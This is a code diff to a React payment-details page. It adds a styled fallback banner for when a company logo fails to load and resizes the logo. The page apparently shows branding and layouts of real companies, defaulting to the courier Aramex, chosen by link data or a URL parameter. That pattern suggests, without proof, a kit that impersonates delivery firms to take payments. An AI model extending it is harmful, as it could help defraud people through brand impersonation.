@@ -1,4 +1,5 @@
 import { useParams, useNavigate } from "react-router-dom";
+import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
@@ -13,6 +14,7 @@ const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const [logoError, setLogoError] = useState(false);
 
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -76,14 +78,24 @@ const PaymentDetails = () => {
   const paymentContent = (
     <>
       {/* Service Logo & Branding */}
-      {branding.logo && (
+      {branding.logo && !logoError ? (
         <div className="mb-6 sm:mb-8 flex items-center justify-center">
           <img 
             src={branding.logo} 
             alt={serviceName}
-            className="h-12 sm:h-16 object-contain"
+            className="h-14 sm:h-20 object-contain max-w-[200px] sm:max-w-[280px]"
             style={{ filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.1))' }}
+            onError={() => setLogoError(true)}
           />
+        </div>
+      ) : (
+        <div 
+          className="mb-6 sm:mb-8 p-4 rounded-lg flex items-center justify-center"
+          style={{
+            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+          }}
+        >
+          <h2 className="text-xl sm:text-2xl font-bold text-white">{serviceName}</h2>
         </div>
       )}
 
